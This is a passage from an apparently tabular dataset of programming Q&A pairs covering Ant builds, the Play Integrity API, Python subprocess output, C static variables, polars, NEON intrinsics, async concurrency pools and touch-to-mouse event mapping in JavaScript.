You can achieve the same with 
df.iloc[0:0]

which is much more efficient.
",python
can39t to access main class during run target,"I'm trying to build and run a Java project using Ant. The project structure looks like this:
.
├── build.xml
├── lib
│   ├── hamcrest-3.0.jar
│   └── junit-4.13.2.jar
├── src
│   └── tdd
│       ├── Board.java
│       ├── Main.java
│       ├── Player.java
│       └── TicTacToe.java
└── test
    └── tdd
        └── TicTacToeTest.java


This is my build.xml file:
<project name=""TDD"" default=""jar"" basedir=""."">
    <!-- Set global properties for the build -->
    <property name=""src.dir"" value=""src""/>
    <property name=""build.dir"" value=""build""/>
    <property name=""classes.dir"" value=""${build.dir}/classes""/>
    <property name=""lib.dir"" value=""lib""/>
    <property name=""dist.dir"" value=""${build.dir}/dist""/>
    <property name=""jar.file"" value=""${dist.dir}/MyJavaProject.jar""/>
    <property name=""test.dir"" value=""test""/>
    <property name=""test.report.dir"" value=""${build.dir}/test-reports""/>

    <!-- Initialize the build directory structure -->
    <target name=""init"">
        <mkdir dir=""${classes.dir}""/>
        <mkdir dir=""${dist.dir}""/>
        <mkdir dir=""${test.report.dir}""/>
    </target>

    <!-- Compile the Java source files -->
    <target name=""compile"" depends=""init"">
        <javac srcdir=""${src.dir}"" destdir=""${classes.dir}"" includeantruntime=""false"">
            <classpath>
                <fileset dir=""${lib.dir}"" includes=""*.jar""/>
            </classpath>
        </javac>
    </target>

    <!-- other targets... -->

    <!-- Clean up build files -->
    <target name=""clean"">
        <delete dir=""${build.dir}""/>
    </target>
</project>

After running ant compile the following folder is added:
.
├── build
│   ├── classes
│   │   └── tdd
│   │       ├── Board.class
│   │       ├── Main.class
│   │       ├── Player.class
│   │       └── TicTacToe.class
│   ├── dist
│   └── test-reports
.
. // the rest of the project
.

I am trying to run the Main.class using this target:
<target name=""run"" depends=""compile"">
    <java classname=""tdd.Main"" fork=""true"" />
</target>

But the tdd.Main can't be founded for some reason.
How can I fix it?
More info that might help:

I'm using Ant version 1.10.15
My Java version is 17.0.12
The Main.java class is located in the tdd package.

","You need to set the classpath, ant is effectively scripting; that is, the <compile> task just defines a thing it can do, it does not define a global truth (that all class files are to be found in ${classes.dir}.
<java classname=""tdd.Main"" fork=""true"">
  <classpath>
    <fileset dir=""${lib.dir}"" includes=""*.jar""/>
    <pathelement path=""${classes.dir}""/>
  </classpath>
</java>

",java
google playintegrity api a nightmare,"I need some help guys!! I am a self-taught, newbie in encryption, and after reading, testing, and error for more than two weeks on how to solve this, and finding very little crowd knowledge and almost no documentation from Google.
I am trying to read the integrity verdict, that I have managed to get it IntegrityTokenRequest doing
    String nonce = Base64.encodeToString(""this_is_my_nonce"".getBytes(), Base64.URL_SAFE | Base64.NO_WRAP | Base64.NO_PADDING);
    IntegrityManager myIntegrityManager =   IntegrityManagerFactory
          .create(getApplicationContext());
    // Request the integrity token by providing a nonce.
    Task<IntegrityTokenResponse> myIntegrityTokenResponse = myIntegrityManager
          .requestIntegrityToken(IntegrityTokenRequest
          .builder()
          .setNonce(nonce)
          .build());

    myIntegrityTokenResponse.addOnSuccessListener(new OnSuccessListener<IntegrityTokenResponse>() {
        @Override
        public void onSuccess(IntegrityTokenResponse myIntegrityTokenResponse) {
            String token = myIntegrityTokenResponse.token();
            // so here I have my Integrity token.
            // now how do I read it??
        }
    }

As per the documentation, it's all set up in the Play Console, and created the Google Cloud project accordingly. Now here comes the big hole in the documentation:
a) The JWT has 4 dots that divide the JWT into 5 sections, not in 3 sections as described here https://jwt.io/
b) Developer.Android.com recommends to Decrypt and Verify on Google Servers

I have no idea on how or were to execute this command... :-(
c) if I choose to decrypt and verify the returned token it's more complicated as I don't have my own secure server environment, only my App and the Google Play Console.
d) I found in the Google Clound Platform OAuth 2.0 Client IDs ""Android client for com.company.project"" JSON file that I have downloaded, but no clue (again) on how to use it in my App for getting the veredict from the Integrity Token.
{""installed"":
    {""client_id"":""123456789012-abcdefghijklmnopqrstuvwxyza0g2ahk.apps.googleusercontent.com"",
        ""project_id"":""myproject-360d3"",
        ""auth_uri"":""https://accounts.google.com/o/oauth2/auth"",
        ""token_uri"":""https://oauth2.googleapis.com/token"",
        ""auth_provider_x509_cert_url"":https://www.googleapis.com/oauth2/v1/certs
    }
}

I'm sure I am missing a lot, please help
","Using a cloud server to decode and verify the token is better.
For example, if you going with Java service then the below code will send the integrity token to the google server hence you can verify the response.
Enable PlayIntegrity API in Google Cloud Platform against the app and download the JSON file and configure in the code.
Similarly, you should enable PlayIntegrity API in Google PlayConsole against the app
Add Google Play Integrity Client Library to your project
Maven Dependency
<project>
 <dependencies>
   <dependency>
     <groupId>com.google.apis</groupId>
     <artifactId>google-api-services-playintegrity</artifactId>
     <version>v1-rev20220211-1.32.1</version>
   </dependency>
 </dependencies>

Gradle
repositories {
   mavenCentral()
}
dependencies {
   implementation 'com.google.apis:google-api-services-playintegrity:v1-rev20220211-1.32.1'
}

Token decode
DecodeIntegrityTokenRequest requestObj = new DecodeIntegrityTokenRequest();
requestObj.setIntegrityToken(request.getJws());
//Configure downloaded Json file
GoogleCredentials credentials = GoogleCredentials.fromStream(new FileInputStream(""<Path of JSON file>\\file.json""));
HttpRequestInitializer requestInitializer = new HttpCredentialsAdapter(credentials);

 HttpTransport HTTP_TRANSPORT = new NetHttpTransport();
 JsonFactory JSON_FACTORY = new JacksonFactory();
 GoogleClientRequestInitializer initialiser = new PlayIntegrityRequestInitializer();
 
 
Builder playIntegrity = new PlayIntegrity.Builder(HTTP_TRANSPORT, JSON_FACTORY, requestInitializer).setApplicationName(""testapp"")
        .setGoogleClientRequestInitializer(initialiser);
             PlayIntegrity play = playIntegrity.build();
    
DecodeIntegrityTokenResponse response = play.v1().decodeIntegrityToken(""com.test.android.integritysample"", requestObj).execute();

Then the response will be as follows
{
""tokenPayloadExternal"": {
    ""accountDetails"": {
        ""appLicensingVerdict"": ""LICENSED""
    },
    ""appIntegrity"": {
        ""appRecognitionVerdict"": ""PLAY_RECOGNIZED"",
        ""certificateSha256Digest"": [""pnpa8e8eCArtvmaf49bJE1f5iG5-XLSU6w1U9ZvI96g""],
        ""packageName"": ""com.test.android.integritysample"",
        ""versionCode"": ""4""
    },
    ""deviceIntegrity"": {
        ""deviceRecognitionVerdict"": [""MEETS_DEVICE_INTEGRITY""]
    },
    ""requestDetails"": {
        ""nonce"": ""SafetyNetSample1654058651834"",
        ""requestPackageName"": ""com.test.android.integritysample"",
        ""timestampMillis"": ""1654058657132""
    }
}
}

Check for License
String licensingVerdict = response.getTokenPayloadExternal().getAccountDetails().getAppLicensingVerdict();
    if(!licensingVerdict.equalsIgnoreCase(""LICENSED"")) {
         throw new Exception(""Licence is not valid."");
            
    }

Verify App Integrity
public void checkAppIntegrity(DecodeIntegrityTokenResponse response,  String appId) throws Exception {
    AppIntegrity appIntegrity = response.getTokenPayloadExternal().getAppIntegrity();
    
    if(!appIntegrity.getAppRecognitionVerdict().equalsIgnoreCase(""PLAY_RECOGNIZED"")) {
        throw new Exception(""The certificate or package name does not match Google Play records."");
    }
     if(!appIntegrity.getPackageName().equalsIgnoreCase(appId)) {
         throw new Exception(""App package name mismatch."");
        
     }
     
     if(appIntegrity.getCertificateSha256Digest()!= null) {
        //If the app is deployed in Google PlayStore then Download the App signing key certificate from Google Play Console (If you are using managed signing key). 
        //otherwise download Upload key certificate and then find checksum of the certificate.
         Certificate cert = getCertificate(""<Path to Signing certificate>\deployment_cert.der"");
         MessageDigest md = MessageDigest.getInstance(""SHA-256""); 

        byte[] der = cert.getEncoded(); 
        md.update(der);
        byte[] sha256 = md.digest();
        
        //String checksum = Base64.getEncoder().encodeToString(sha256);
       String checksum = Base64.getUrlEncoder().encodeToString(sha256);
       /** Sometimes checksum value ends with '=' character, you can avoid this character before perform the match **/
       checksum = checksum.replaceAll(""="","""");        
        if(!appIntegrity.getCertificateSha256Digest().get(0).contains(checksum)) {
             throw new Exception(""App certificate mismatch."");
        }
     }
}
public static Certificate getCertificate(String certificatePath)
        throws Exception {
    CertificateFactory certificateFactory = CertificateFactory
            .getInstance(""X509"");
    FileInputStream in = new FileInputStream(certificatePath);

    Certificate certificate = certificateFactory
            .generateCertificate(in);
    in.close();

    return certificate;
}

Verify Device integrity
//Check Device Integrity
public void deviceIntegrity(DecodeIntegrityTokenResponse response) {
    DeviceIntegrity deviceIntegrity = response.getTokenPayloadExternal().getDeviceIntegrity();
    if(!deviceIntegrity.getDeviceRecognitionVerdict().contains(""MEETS_DEVICE_INTEGRITY"")) {
        throw new Exception(""Does not meet Device Integrity."");
        
    }
}

Similary you can verify the Nonce and App Package name with previously stored data in server
",java
ellipsis in the middle of a text mac style,"I need to implement ellipsis (""..."") in the middle of a text within a resizable element. Here is what it might look like. So,
""Lorem ipsum dolor sit amet. Ut ornare dignissim ligula sed commodo.""

becomes
""Lorem ipsum dolor sit amet ... commodo.""

When the element is stretched out to the width of the text, I want the ellipsis to disappear. How can this be done?
","In the HTML, put the full value in a custom data-* attribute like
<span data-original=""your string here""></span>

Then assign load and resize event listeners to a JavaScript function which will read the original data attribute and place it in the innerHTML of your span tag. Here is an example of the ellipsis function:
function start_and_end(str) {
  if (str.length > 35) {
    return str.substr(0, 20) + '...' + str.substr(str.length-10, str.length);
  }
  return str;
}

Adjust the values, or if possible, make them dynamic, if necessary for different objects. If you have users from different browsers, you can steal a reference width from a text by the same font and size elsewhere in your dom. Then interpolate to an appropriate amount of characters to use.
A tip is also to have an abbr-tag on the ... or who message to make the user be able to get a tooltip with the full string.
<abbr title=""simple tool tip"">something</abbr>

",javascript
reading a ospopencommand into a string,"I'm not to sure if my title is right.
What I'm doing is writing a python script to automate some of my code writing.
So I'm parsing through a .h file.
but I want to expand all macros before I start.
so I want to do a call to the shell to:
gcc -E myHeader.h

Which should out put the post preprocessed version of myHeader.h to stdout.
Now I want to read all that output straight into a string for further processing.
I've read that i can do this with popen, but I've never used pipe objects.
how do i do this? 
","The os.popen function just returns a file-like object. You can use it like so:
import os

process = os.popen('gcc -E myHeader.h')
preprocessed = process.read()
process.close()

As others have said, you should be using subprocess.Popen. It's designed to be a safer version of os.popen. The Python docs have a section describing how to switch over.
",python
is it possible to access static local variable outside the function where it is declared,"For a static variable defined within a C function, like below:
int f1()
{
   static int var2 = 42;
   var2++;
   printf(""var2=%d\n"", var2);
}

The var2 will be stored in the .data segment (because it is explicitly initialized to 42, thanks to @busybee pointing this out):
0000000000004014 l     O .data  0000000000000004              var2.2316

The var2 will be stored in the .bss segment if I don't explicitly initialize it or initialize it to 0):
000000000000401c l     O .bss   0000000000000004              var2.2316

There are 2 aspects about the var2:

Its lifetime is the same as the whole program.
But its scope is limited to within f1().

The bss section is meant for uninitialized global data.  While the data section is meant for initialized yet still global data. The var2 lives in bss so it must be global in a sense.
I think the reason that var2 can only be accessed within f1() is just some syntactical rule placed by the compiler. If we iterate through the bss section, the var2 must be accessible from outside the f1(). Am I right on this? Thanks.
","
There are 2 aspects about the var2:

Its lifetime is the same as the whole program.
But its scope is limited to within f1().


Yes and no.  Lifetime is a property of objects.  Scope is a property of identifiers (names).  That the scope of var2 is from its declaration in f1() to the end of the function is about the region of the source wherein that name identifies the object in question.  On the other hand, that the lifetime of the object identified by var2 inside that scope is the same as the whole program's is about the object itself.

The bss section is meant for uninitialized global data. While the data section is meant for initialized global data. The var2 lives in bss so it must be global in a sense.

Be very careful about trying to infer language semantics from implementation details.  It is very easy to get that wrong, and very hard to get it right in all details.  In this particular case, the object in question is global in exactly the sense that its lifetime is the same as the whole program's, which you already knew.
For the record, ""global"" is not a C-language term.  When people say ""global variable"" in C context, they usually mean a variable more properly described as having external linkage, which necessarily identifies an object having static storage duration (i.e. the whole execution of the program).  That's not what you're looking at in the case of var2.

I think the reason that var2 can only be accessed within f1() is just some syntactical rule placed by the compiler.

More or less yes.  The object can be accessed by name only within the scope of that name.  This is among the semantic rules of the C language.  It is essentially the definition of ""scope"".

If we iterate through the bss section, the var2 must be accessible from outside the f1(). Am I right on this?

How do you propose to ""iterate through the bss section""?  In the first place, that's a characteristic of some executable file formats, not a runtime characteristic of the program.  But perhaps you mean ""iterate through memory"", but even then, C does not define a way to do that.
With that said, if f1() published a pointer to its var2 variable, via an out variable, for example, that pointer could indeed be used outside the function to access that object.  Like this, for example:
int f1(int **pptr) {
   static int var2 = 42;
   *pptr = &var2;
   var2++;
   return printf(""var2=%d\n"", var2);
}

// ...

void other_function() {
    int *ptr;
    int res = f1(&ptr);
    printf(""%d\n"", *ptr);
}

",c
how to send message from website to telegram app,"I have a share button in my website and I want to send a specific message to Telegram APP contacts (when I open website in Mobile)
The Problem is I didnt find the complete code and it just open the APP in the mobile
my code is :
<a href=""tg://"" id=""telegram_share"" class=""mobileShare"" title=""inviteFriends"" alt=""telegram_share""></a>

as you see I didnt find proper command for sending message in href property
for example I found something simillar for adding sticker like :
<a class=""tgme_action_button"" href=""tg://addstickers?set=Saber2"">Add Stickers</a>

","It's called a URI Scheme.
<a href=""tg://msg?text=your MsG!"" id=""telegram_share"" class=""mobileShare"" title=""inviteFriends"" alt=""telegram_share""></a>

Right now this only works on iOS.
",javascript
polars read_csv to read from string and not from file,"Is it possible to read from string with pl.read_csv() ? Something like this, which would work :
content = """"""c1, c2
            A,1
            B,3
            C,2""""""
pl.read_csv(content)

I know of course about this :
pl.DataFrame({""c1"":[""A"", ""B"", ""C""],""c2"" :[1,3,2]})

But it is error-prone with long tables and you have to count numbers to know which value to modify.
I also know about dictionaries but I have more than 2 columns in my real life example.
Context: I used to fread() content with R data.table and it was very useful, especially when you want to convert a column with the help of a join, instead of complicated ifelse() statements
Thanks !
","pl.read_csv() accepts IO as source parameter.

source: str | Path | IO[str] | IO[bytes] | bytes

So you can use io.StringIO:
from io import StringIO

content = """"""
c1,c2
A,1
B,3
C,2
""""""

data = StringIO(content)
pl.read_csv(data)

shape: (3, 2)
┌─────┬─────┐
│ c1  ┆ c2  │
│ --- ┆ --- │
│ str ┆ i64 │
╞═════╪═════╡
│ A   ┆ 1   │
│ B   ┆ 3   │
│ C   ┆ 2   │
└─────┴─────┘

As you can see above, you can also pass bytes as source parameter. You can use str.encode() method for that:
content = """"""
c1,c2
A,1
B,3
C,2
""""""

pl.read_csv(content.encode())

shape: (3, 2)
┌─────┬─────┐
│ c1  ┆ c2  │
│ --- ┆ --- │
│ str ┆ i64 │
╞═════╪═════╡
│ A   ┆ 1   │
│ B   ┆ 3   │
│ C   ┆ 2   │
└─────┴─────┘

",python
what is best practice to remove duplicateredundant api requests,"So I am working in a React platform that has data that updates every second(I would like to move to web-sockets but its currently only supports gets).Currently, each  component makes a fetch request for itself to get the data for the widget. Because the fetch requests are built into the widgets there are redundant api requests for the same data. I am looking for a possible better solution to remove these redundant api requests.
The solution I came up with uses what I call a data service that checks for any subscription to data sources then makes those api calls and places the data in a redux state for the components to then be used. I am unsure if this is the best way to go about handling the issue I am trying to avoid. I don't like how I need an interval to be run every second the app is running to check if there are ""subscriptions"". I am unsure if thats the correct way to go about it. With this solution I don't duplicate any requests and can add or remove a subscription without affecting other components.
One more thing, the id can change and will change what data I recieve
Here is a simplified version of how I am handling the service.
const reduxState = {
 id: ""specific-id"",  
 subscriptions: {
    sourceOne: [""source-1-id-1"", ""source-1-id-2"", ""source-1-id-3""],
    sourceTwo: [""source-2-id-1"", ""source-one-id-2""],
  },
  data: {
    sourceOne: { id: ""specific-id"", time: ""milliseconds"", data: ""apidata"" },
    sourceTwo: { id: ""specific-id"", time: ""milliseconds"", data: ""apidata"" },
  },
};

const getState = () => reduxState; //Would be a dispatch to always get current redux state

const dataService = () => {
  const interval = setInterval(() => {
    const state = getState();
    if (state.subscriptions.sourceOne.length > 0)
      fetchSourcOneAndStoreInRedux();
    if (state.subscriptions.sourceTwo.length > 0)
      fetchSourceTwoAndStoreInRedux();
  }, 1000);
};

const fetchSourcOneAndStoreInRedux = (id) =>{
    return async dispatch => {
        try {
            const res = await axios.get(`/data/one/${id}`) 
            dispatch(setSourceOneDataRedux(res.data))
        } catch (err) {
            console.error(err)
        }
    }
}

I am building my components to only show data from the correct id.
","Here is a simple working example of a simple ""DataManager"" that would achieve what you are looking for.


class DataManager {
  constructor(config = {}) {
    this.config = config;
    console.log(`DataManager: Endpoint ""${this.config.endpoint}"" initialized.`);
    if (this.config.autostart) { // Autostart the manager if autostart property is true
      this.start();
    }
  }

  config; // The config object passed to the constructor when initialized
  fetchInterval; // The reference to the interval function that fetches the data
  data; // Make sure you make this state object observable via MOBX, Redux etc so your component will re-render when data changes.
  fetching = false; // Boolean indicating if the APIManager is in the process of fetching data (prevent overlapping requests if response is slow from server)

  // Can be used to update the frequency the data is being fetched after the class has been instantiated
  // If interval already has been started, stop it and update it with the new interval frequency and start the interval again
  updateInterval = (ms) => {
    if (this.fetchInterval) {
      this.stop();
      console.log(`DataManager: Updating interval to ${ms} for endpoint ${this.config.endpoint}.`);
      this.config.interval = ms;
      this.start();
    } else {
      this.config.interval = ms;
    }
    return this;
  }

  // Start the interval function that polls the endpoint
  start = () => {
    if (this.fetchInterval) {
      clearInterval(this.fetchInterval);
      console.log(`DataManager: Already running! Clearing interval so it can be restarted.`);
    }

    this.fetchInterval = setInterval(async () => {
      if (!this.fetching) {
        console.log(`DataManager: Fetching data for endpoint ""${this.config.endpoint}"".`);
        this.fetching = true;
        // const res = await axios.get(this.config.endpoint); 
        // Commented out for demo purposes but you would uncomment this and clear the anonymous function below
        const res = {};
        (() => {
          res.data = {
            dataProp1: 1234,
            dataProp2: 4567
          }
        })();
        this.fetching = false;
        this.data = res.data;
      } else {
        console.log(`DataManager: Waiting for pending response for endpoint ""${this.config.endpoint}"".`);
      }
    }, this.config.interval);

    return this;
  }

  // Stop the interval function that polls the endpoint
  stop = () => {
    if (this.fetchInterval) {
      clearInterval(this.fetchInterval);
      console.log(`DataManager: Endpoint ""${this.config.endpoint}"" stopped.`);
    } else {
      console.log(`DataManager: Nothing to stop for endpoint ""${this.config.endpoint}"".`);
    }
    return this;
  }

}

const SharedComponentState = {
  source1: new DataManager({
    interval: 1000,
    endpoint: `/data/one/someId`,
    autostart: true
  }),
  source2: new DataManager({
    interval: 5000,
    endpoint: `/data/two/someId`,
    autostart: true
  }),
  source3: new DataManager({
    interval: 10000,
    endpoint: `/data/three/someId`,
    autostart: true
  })
};

setTimeout(() => { // For Demo Purposes, Stopping and starting DataManager.
  SharedComponentState.source1.stop();
  SharedComponentState.source1.updateInterval(2000);
  SharedComponentState.source1.start();
}, 10000);

// Heres what it would look like to access the DataManager data (fetched from the api)
// You will need to make sure you pass the SharedComponentState object as a prop to the components or use another React mechanism for making that SharedComponentState accessible to the components in your app
// Accessing state for source 1: SharedComponentState.source1.data
// Accessing state for source 2: SharedComponentState.source2.data
// Accessing state for source 3: SharedComponentState.source3.data



Basically, each instance of the DataManager class is responsible for fetching a different api endpoint. I included a few other class methods that allow you to start, stop and update the polling frequency of the DataManager instance.
",javascript
measuring time takes some time how to know which quotpoint of timequot is being measured,"Consider the following call:
clock_gettime(CLOCK_MONOTONIC_RAW, &ts_beg);

On my machine, that call takes in average 25ns. Should I assume that the time you get have an error of ±12.5ns? Or that function (and in general, time-measuring functions) are ""designed""/adjust to give you the time at function exit or whatever? In general, what can I say about the time point given by the function, considering that its execution takes some time as well?
","On my machine, that call takes in average 25ns. Should I assume that the time you get have an error of ±12.5ns?
Not even remotely close.
First of all, CLOCK_MONOTONIC_RAW has no rate-correction or drift-correction, so your precision and accuracy may be arbitrarily bad. Realistically, it may be off-rate by as much as 5% and the non-raw clock would all still behave sane in the presence of a NTP server, but CLOCK_MONOTONIC_RAW lets you experience that rate-error first-hand.
Don't confuse the permitted 0.05% drift rate limit compared to NTP for CLOCK_REALTIME/CLOCK_MONOTONIC (intended to be used for offset-correction) with the actual rate factor between the raw and the NTP synchronized clock types. The later may exceed your expectation by a lot.
Secondly, you have no guarantees whatsoever about the granularity of that clock. It might just update once per millisecond, or whatever the backing hardware real time clock uses for granularity. In fact, on most systems CLOCK_MONOTONIC is properly interpolated between ticks of the realtime hardware clock by the use of additional timers (e.g. CPU cycle count), while CLOCK_MONOTONIC_RAW does not benefit from this.
So assuming a round trip time of 25ns, a granularity of 1ms and a drift rate of up to 5%, your actual error with CLOCK_MONOTONIC_RAW is more around ±(1ms+12.5ns)*1.05, which is leaps and bounds worse than what you estimated based on the round trip time alone.
",c
how do i cast a vector to a float64_t to check a simd compare for allzero,"I'm working with ARM NEON using the intrinsics published by ARM.  I would like my code to work both on ARMv7 and AArch64.  One idiom I use to check if a vector is all zero is this assembly idiom:
shrn v0.8b, v0.8h, #4    // compress bytes in v0 into nibbles
fcmp d0, #0.0

This works correctly if all bytes of v0 are either 0x00 or 0xff, which is the case in my code.
To translate this idiom into C code, I tried to use code like this, which succesfully builds on AArch64 and yields the desired machine code:
static int
veq_zero(uint8x16_t v)
{
    uint8x8_t narrowed;

    /* narrow each byte to a nibble */
    narrowed = vshrn_n_u16(vreinterpretq_u16_u8(v), 4);

    /* check if that vector is all zero */
    return (vdupd_lane_f64(vreinterpret_f64_u16(narrowed), 0) == 0.0);
}

Unfortunately neither the vdupd_lane_f64 nor the vreinterpret_f64_u16 call are available on ARMv7; it seems that indeed the entire float64x1_t type and all its related functions are absent.
What's the best way to cast this program idiom into C with intrinsics such that it compiles both for ARMv7 with NEON and for AArch64?
","To work around this short coming, I ended up type-punning through a union:
static int
veq_zero(uint8x16_t v)
{
#ifdef __arm__
    union { uint8x8_t v; double d; } narrowed;

    /* narrow each byte to a nibble */
    narrowed.v = vshrn_n_u16(vreinterpretq_u16_u8(v), 4);

    /* check if that vector is all zero */
    return (narrowed.d == 0.0);
#else /* AArch64 */
    uint8x8_t narrowed;

    /* narrow each byte to a nibble */
    narrowed = vshrn_n_u16(vreinterpretq_u16_u8(v), 4);

    /* check if that vector is all zero */
    return (vdupd_lane_f64(vreinterpret_f64_u16(narrowed), 0) == 0.0);
#endif
}

This is legal in C; for C++, you'd want memcpy or C++20 std::bit_cast<double>(narrowed_v) on uint8x8_t narrowed_v.
Also, MSVC and GCC/Clang define the behaviour of union type-punning as an extension to C++, so the above code is also safe there.
Not happy with this solution, I hope there is a nicer one.
",c
google play developer api  400 invalid value  inapppurchases,"My question is similar to this one. However, I am using the API Java Client Library with a service account, making calls to the API from my server.
My code is following this guide, which is very simple. However, I can't seem to get an appropriate error for my request. This is how I build my AndroidPublisher:
val credential = GoogleCredential.fromStream(FileInputStream(
        ""/path/to/json""
)).createScoped(Collections.singleton(AndroidPublisherScopes.ANDROIDPUBLISHER))

androidPublisher = AndroidPublisher.Builder(httpTransport, JSON_FACTORY, credential)
        .setApplicationName(packageName)
        .build()

Where the JSON is generated from the Developer Console, under Service Accounts. This is how I make my request:
androidPublisher.purchases().subscriptions().get(packageName, ""valid-sku"", ""invalid-token"").execute()

My subscription ID is valid but my token is invalid. I expect an error such as ""invalid token"" in the response. However, what I get is:
com.google.api.client.googleapis.json.GoogleJsonResponseException: 400 Bad Request
{
  ""code"" : 400,
  ""errors"" : [ {
    ""domain"" : ""global"",
    ""message"" : ""Invalid Value"",
    ""reason"" : ""invalid""
  } ],
  ""message"" : ""Invalid Value""
}

Is that a generic error because of the invalid token or is it an authentication issue? If it an authentication issue, how do I solve it? If it is an invalid token issue, how am I supposed to know?
Some more information: 

I get the same error when trying to make that call from the API Explorer as well (this time using a Client ID and API Key instead of Service Account).
I have not delegated domain-wide access to the service account. Do I have to for some reason?
I can successfully make other calls to the API such as inappproducts.list

","So, the reason that happened was just because the purchaseToken I was using was wrong.
I did not expect that to be the reason as I thought that in the case of an invalid token, I would receive a ""token invalid"" error (or something similar). As it turns out, the responses given by Google are pretty inconsistent (a 404 could also be given for an invalid token).
",java
how can i execute some async tasks in parallel with limit in generator function,"I'm trying to execute some async tasks in parallel with a limitation on the maximum number of simultaneously running tasks.
There's an example of what I want to achieve:

Currently this tasks are running one after another. It's implemented this way:
export function signData(dataItem) {
  cadesplugin.async_spawn(async function* (args) {
    //... nestedArgs assignment logic ...

    for (const id of dataItem.identifiers) {
      yield* idHandler(dataItem, id, args, nestedArgs);
    }
    
    // some extra logic after all tasks were finished
  }, firstArg, secondArg);
}

async function* idHandler(edsItem, researchId, args, nestedArgs) {
  ...
  let oDocumentNameAttr = yield cadesplugin.CreateObjectAsync(""CADESCOM.CPAttribute"");
  yield oDocumentNameAttr.propset_Value(""Document Name"");
  ...
  // this function mutates some external data, making API calls and returns void
}

Unfortunately, I can't make any changes in cadesplugin.* functions, but I can use any external libraries (or built-in Promise) in my code.
I found some methods (eachLimit and parallelLimit) in async library that might work for me and an answer that shows how to deal with it.
But there are still two problems I can't solve:

How can I pass main params into nested function?
Main function is a generator function, so I still need to work with yield expressions in main and nested functions

There's a link to cadesplugin.* source code, where you can find async_spawn (and another cadesplugin.*) function that used in my code.
That's the code I tried with no luck:
await forEachLimit(dataItem.identifiers, 5, yield* async function* (researchId, callback) { 
  //... nested function code 
});

It leads to Object is not async iterable error.
Another attempt:
let functionArray = [];
dataItem.identifiers.forEach(researchId => {
  functionArray.push(researchIdHandler(dataItem, id, args, nestedArgs))
});
await parallelLimit(functionArray, 5);

It just does nothing.
Сan I somehow solve this problem, or the generator functions won't allow me to do this?
","square peg, round hole
You cannot use async iterables for this problem. It is the nature of for await .. of to run in series. await blocks and the loop will not continue until the awaited promise has resovled. You need a more precise level of control where you can enforce these specific requirements.
To start, we have a mock myJob that simulates a long computation. More than likely this will be a network request to some API in your app -
// any asynchronous task
const myJob = x =>
  sleep(rand(5000)).then(_ => x * 10)

Using Pool defined in this Q&A, we instantiate Pool(size=4) where size is the number of concurrent threads to run -
const pool = new Pool(4)

For ergonomics, I added a run method to the Pool class, making it easier to wrap and run jobs -
class Pool {
  constructor (size) ...
  open () ...
  deferNow () ...
  deferStacked () ...

  // added method
  async run (t) {
    const close = await this.open()
    return t().then(close)
  }
}

Now we need to write an effect that uses our pool to run myJob. Here you will also decide what to do with the result. Note the promise must be wrapped in a thunk otherwise pool cannot control when it begins  -
async function myEffect(x) {
  // run the job with the pool
  const r = await pool.run(_ => myJob(x))

  // do something with the result
  const s = document.createTextNode(`${r}\n`)
  document.body.appendChild(s)

  // return a value, if you want
  return r
}

Now run everything by mapping myEffect over your list of inputs. In our example myEffect we return r  which means the result is also available after all results are fetched. This optional but demonstrates how program knows when everything is done -
Promise.all([1,2,3,4,5,6,7,8,9,10,11,12].map(myEffect))
  .then(JSON.stringify)
  .then(console.log, console.error)

full program demo
In the functioning demo below, I condensed the definitions so we can see them all at once. Run the program to verify the result in your own browser -


class Pool {
  constructor (size = 4) { Object.assign(this, { pool: new Set, stack: [], size }) }
  open () { return this.pool.size < this.size ? this.deferNow() : this.deferStacked() }
  run (t) { return this.open().then(close => t().then(close)) }
  deferNow () { const [t, close] = thread(); const p = t.then(_ => this.pool.delete(p)).then(_ => this.stack.length && this.stack.pop().close()); this.pool.add(p); return Promise.resolve(close) }
  deferStacked () { const [t, close] = thread(); this.stack.push({ close }); return t.then(_ => this.deferNow()) }
}
const rand = x => Math.random() * x
const effect = f => x => (f(x), x)
const thread = close => [new Promise(r => { close = effect(r) }), close]
const sleep = ms => new Promise(r => setTimeout(r, ms))

const myJob = x =>
  sleep(rand(5000)).then(_ => x * 10)

async function myEffect(x) {
  const r = await pool.run(_ => myJob(x))
  const s = document.createTextNode(`${r}\n`)
  document.body.appendChild(s)
  return r
}
  
const pool = new Pool(4)

Promise.all([1,2,3,4,5,6,7,8,9,10,11,12].map(myEffect))
  .then(JSON.stringify)
  .then(console.log, console.error)



slow it down
Pool above runs concurrent jobs as quickly as possible. You may also be interested in throttle which is also introduced in the original post. Instead of making Pool more complex, we can wrap our jobs using throttle to give the caller control over the minimum time a job should take -
const throttle = (p, ms) =>
  Promise.all([ p, sleep(ms) ]).then(([ value, _ ]) => value)

We can add a throttle in myEffect. Now if myJob runs very quickly, at least 5 seconds will pass before the next job is run -
async function myEffect(x) {
  const r = await pool.run(_ => throttle(myJob(x), 5000))
  const s = document.createTextNode(`${r}\n`)
  document.body.appendChild(s)
  return r
}

",javascript
javascript mapping touch events to mouse events,"I'm using the YUI slider that operates with mouse move events. I want to make it respond to touchmove events (iPhone and Android). How can I produce a mouse move event when a touchmove event occurs? I'm hoping that just by adding some script at the top that touchmove events will get mapped to the mouse move events and I won't have to change anything with the slider.
","I am sure this is what you want:
function touchHandler(event)
{
    var touches = event.changedTouches,
        first = touches[0],
        type = """";
    switch(event.type)
    {
        case ""touchstart"": type = ""mousedown""; break;
        case ""touchmove"":  type = ""mousemove""; break;        
        case ""touchend"":   type = ""mouseup"";   break;
        default:           return;
    }

    // initMouseEvent(type, canBubble, cancelable, view, clickCount, 
    //                screenX, screenY, clientX, clientY, ctrlKey, 
    //                altKey, shiftKey, metaKey, button, relatedTarget);

    var simulatedEvent = document.createEvent(""MouseEvent"");
    simulatedEvent.initMouseEvent(type, true, true, window, 1, 
                                  first.screenX, first.screenY, 
                                  first.clientX, first.clientY, false, 
                                  false, false, false, 0/*left*/, null);

    first.target.dispatchEvent(simulatedEvent);
    event.preventDefault();
}

function init() 
{
    document.addEventListener(""touchstart"", touchHandler, true);
    document.addEventListener(""touchmove"", touchHandler, true);
    document.addEventListener(""touchend"", touchHandler, true);
    document.addEventListener(""touchcancel"", touchHandler, true);    
}

I've captured the touch events and then manually fired my own mouse events to match. Although the code isn't particularly general purpose as is, it should be trivial to adapt to most existing drag and drop libraries, and probably most existing mouse event code. Hopefully this idea will come in handy to people developing web applications for the iPhone.
Update:
